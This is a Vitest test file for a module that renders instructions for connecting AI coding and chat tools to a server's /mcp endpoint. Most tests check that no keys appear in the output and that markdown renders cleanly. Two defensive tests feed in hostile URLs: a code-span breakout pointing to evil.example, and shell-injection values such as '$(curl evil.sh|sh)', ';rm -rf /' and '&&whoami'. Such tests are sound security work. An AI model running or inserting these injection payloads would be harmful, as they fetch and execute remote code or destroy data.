import { describe, it, expect } from "vitest";
import {
  HARNESSES,
  harnessById,
  renderHarnessDoc,
  renderAllHarnessDocs,
  type ConnectDocsContext,
} from "./agent-connect-docs";

const KEYED: ConnectDocsContext = { serverUrl: "https://nest.example.com" };
const OPEN: ConnectDocsContext = { serverUrl: "https://nest.example.com", openMode: true };

describe("harness registry", () => {
  it("has a unique id and a non-empty name for every harness", () => {
    const ids = HARNESSES.map((h) => h.id);
    expect(ids.length).toBeGreaterThan(0);
    expect(new Set(ids).size).toBe(ids.length);
    for (const h of HARNESSES) {
      expect(h.name.trim()).not.toBe("");
      expect(h.where.trim()).not.toBe("");
    }
  });

  it("covers the harnesses an admin is most likely to be asked about", () => {
    const ids = HARNESSES.map((h) => h.id);
    for (const expected of [
      "claude-code",
      "claude-desktop",
      "chatgpt",
      "codex",
      "grok",
      "hermes",
      "perplexity",
      "cursor",
      "gemini-cli",
    ]) {
      expect(ids).toContain(expected);
    }
  });

  it("looks a harness up by id and returns undefined for an unknown one", () => {
    expect(harnessById("claude-code")?.name).toMatch(/Claude Code/i);
    expect(harnessById("nope")).toBeUndefined();
  });
});

describe("rendered instructions", () => {
  it("points every harness at the server-level /mcp endpoint", () => {
    for (const h of HARNESSES) {
      expect(renderHarnessDoc(h, KEYED)).toContain("https://nest.example.com/mcp");
    }
  });

  it("tolerates a trailing slash on the server URL without doubling it", () => {
    for (const h of HARNESSES) {
      const out = renderHarnessDoc(h, { serverUrl: "https://nest.example.com/" });
      expect(out).toContain("https://nest.example.com/mcp");
      expect(out).not.toContain("https://nest.example.com//mcp");
    }
  });

  /**
   * Same invariant the Connect surfaces hold (see connect.ts): these are
   * instructions, not a credential hand-off. Nothing here may render key
   * material — the admin's key is never in scope, so a `cnst_` literal in the
   * output could only be a hard-coded example that someone would paste.
   */
  it("never renders key material", () => {
    for (const h of HARNESSES) {
      for (const ctx of [KEYED, OPEN]) {
        expect(renderHarnessDoc(h, ctx)).not.toMatch(/cnst_[A-Za-z0-9]/);
      }
    }
  });

  it("drops every credential instruction in open mode", () => {
    for (const h of HARNESSES) {
      const out = renderHarnessDoc(h, OPEN);
      expect(out).not.toMatch(/Bearer/i);
      expect(out).not.toMatch(/CONTEXTNEST_API_KEY/);
    }
  });

  /**
   * The whole point of this panel is ONE connection that reads across every
   * nest the caller can see — public plus whatever private they have access
   * to. A per-nest URL (`/nests/<id>/mcp`) would quietly turn that back into
   * connect-once-per-nest, so no harness may ever render one.
   */
  it("never points a harness at a single nest", () => {
    for (const h of HARNESSES) {
      for (const ctx of [KEYED, OPEN]) {
        expect(renderHarnessDoc(h, ctx)).not.toMatch(/\/nests\//);
      }
    }
  });

  /**
   * Bodies are arrays of markdown lines where `null` means "not on this
   * deployment" and `""` is a paragraph separator. `.filter(Boolean)` drops
   * both, and losing the blank line makes CommonMark treat the following note
   * as a lazy continuation of the last list item — two paragraphs silently
   * become one. Substring assertions can't see that, so check the structure.
   */
  it("keeps a blank line between a numbered list and the prose after it", () => {
    for (const h of HARNESSES) {
      for (const ctx of [KEYED, OPEN]) {
        const lines = renderHarnessDoc(h, ctx).split("\n");
        lines.forEach((line, i) => {
          if (!/^\d+\.\s/.test(line)) return;
          const next = lines[i + 1];
          if (next === undefined) return;
          // A list item may be followed by another item, a blank line, or an
          // indented continuation. Anything else gets folded into this item.
          const ok = next === "" || /^\d+\.\s/.test(next) || /^\s/.test(next);
          expect(
            ok,
            `${h.id}: "${next}" would fold into the list item "${line}"`,
          ).toBe(true);
        });
      }
    }
  });

  /**
   * The oauth-only body used to be a fixed string, so it asserted "this server
   * authenticates with API keys" even on a deployment that has no credential
   * at all. Every other harness branches on openMode; this one has to as well,
   * or the panel tells an open-mode admin something false about their server.
   */
  it("does not claim an open-mode deployment uses API keys", () => {
    for (const h of HARNESSES) {
      expect(renderHarnessDoc(h, OPEN)).not.toMatch(/API key/i);
    }
  });

  /**
   * A conditional sentence plus an unconditional one that opens the same way —
   * e.g. Hermes stating "Streamable HTTP is the default transport" twice in
   * open mode. Whole-sentence equality misses it because the tails differ, so
   * compare opening clauses.
   */
  it("does not open two sentences in one body the same way", () => {
    for (const h of HARNESSES) {
      for (const ctx of [KEYED, OPEN]) {
        const openings = renderHarnessDoc(h, ctx)
          .split("\n")
          .filter((l) => !l.startsWith("    ") && !l.startsWith("```"))
          .flatMap((l) => l.split(/(?<=[.;])\s+/))
          .map((s) => s.trim().toLowerCase().split(/\s+/).slice(0, 5).join(" "))
          .filter((s) => s.split(" ").length === 5);
        expect(
          new Set(openings).size,
          `${h.id} opens two sentences identically`,
        ).toBe(openings.length);
      }
    }
  });

  /**
   * serverUrl comes from the admin-editable `public_base_url`, which the
   * server stores after nothing more than a trim and a trailing-slash strip
   * (src/app.ts). It lands inside single-backtick code spans here, so a
   * literal backtick would close the span and turn the rest of the line into
   * live markdown — in a panel other people are told to copy-paste from.
   * A backtick is never valid in a URL, so drop it rather than escape it.
   */
  it("cannot be broken out of a code span by the configured URL", () => {
    const hostile = {
      serverUrl: "https://n.example.com/`](http://evil.example)`",
    };
    for (const h of HARNESSES) {
      const out = renderHarnessDoc(h, hostile);
      expect(out).not.toContain("`](http://evil.example)");
      // Backticks in the output may only be ones this module wrote.
      expect(out).not.toMatch(/`[^`\n]*`\]\(/);
    }
  });

  /**
   * The markdown code span is only one of the contexts this URL lands in. The
   * same value goes into a `bash` block people paste into a terminal, and into
   * quoted strings in config.toml / config.yaml / mcp.json. The server now
   * refuses these characters when the setting is saved, but this module is
   * handed a string and cannot assume that — an older stored value predates
   * the check, and the fallback is `window.location.origin`.
   */
  it("cannot inject shell or config syntax through the configured URL", () => {
    const hostile = [
      'https://n.example.com/a$(curl evil.sh|sh)',
      "https://n.example.com/a;rm -rf /",
      'https://n.example.com/a","evil":"1',
      "https://n.example.com/a&&whoami",
      "https://n.example.com/a'`\\",
    ];
    // The module's own text legitimately contains backticks, quotes and `$`
    // (code fences, `"url": "…"`, `${env:VAR}`), so assert on the payload
    // rather than on the character set of the whole document.
    const payloads = ["$(", ";rm", '","evil"', "&&whoami", "'", "\\"];
    for (const serverUrl of hostile) {
      for (const h of HARNESSES) {
        const out = renderHarnessDoc(h, { serverUrl });
        const url = out.match(/https:\/\/n\.example\.com\S*/)?.[0] ?? "";
        for (const p of payloads) {
          expect(
            url.includes(p),
            `${h.id} rendered "${url}" from "${serverUrl}"`,
          ).toBe(false);
        }
      }
    }
  });

  it("tells a keyed deployment how to present the key", () => {
    // Every harness that can take a static credential must name one concrete
    // mechanism; an admin reading the panel should never have to guess.
    for (const h of HARNESSES.filter((x) => x.support === "header")) {
      const out = renderHarnessDoc(h, KEYED);
      expect(out).toMatch(/Authorization|Bearer|CONTEXTNEST_API_KEY/);
    }
  });

  /**
   * Perplexity's custom-connector form drives an OAuth client, and Claude's
   * directory listing refuses bearer auth. Neither can work against a
   * deployment that only has API keys, so the panel must SAY that rather than
   * print steps that end in a failed connection.
   */
  it("warns, rather than instructs, where the surface needs OAuth we don't serve yet", () => {
    const oauthOnly = HARNESSES.filter((h) => h.support === "oauth-only");
    expect(oauthOnly.length).toBeGreaterThan(0);
    for (const h of oauthOnly) {
      expect(renderHarnessDoc(h, KEYED)).toMatch(/OAuth/i);
    }
  });
});

describe("the whole panel", () => {
  /**
   * A nest-scoped key sets `nestScope` on the request (src/auth/middleware.ts),
   * and buildNestIndex then filters the index down to that one nest — so the
   * same URL silently behaves as connect-once-per-nest. The panel has to say
   * which kind of key to use, or people will hit that and think it's a bug.
   */
  it("says a user-level key is required, not a nest-scoped one", () => {
    const doc = renderAllHarnessDocs(KEYED);
    expect(doc).toMatch(/user-level key/i);
    expect(doc).toMatch(/scoped to (a|one) (single )?nest|nest-scoped/i);
  });

  it("does not raise the key question at all in open mode", () => {
    expect(renderAllHarnessDocs(OPEN)).not.toMatch(/user-level key/i);
  });

  it("renders every harness under its own heading, in one document", () => {
    const doc = renderAllHarnessDocs(KEYED);
    for (const h of HARNESSES) {
      expect(doc).toContain(`## ${h.name}`);
    }
  });

  it("groups by kind so the chat surfaces aren't buried under the CLIs", () => {
    const doc = renderAllHarnessDocs(KEYED);
    expect(doc.indexOf("# Chat")).toBeGreaterThanOrEqual(0);
    expect(doc.indexOf("# Command line")).toBeGreaterThan(doc.indexOf("# Chat"));
    expect(doc.indexOf("# Editors")).toBeGreaterThan(doc.indexOf("# Command line"));
  });
});
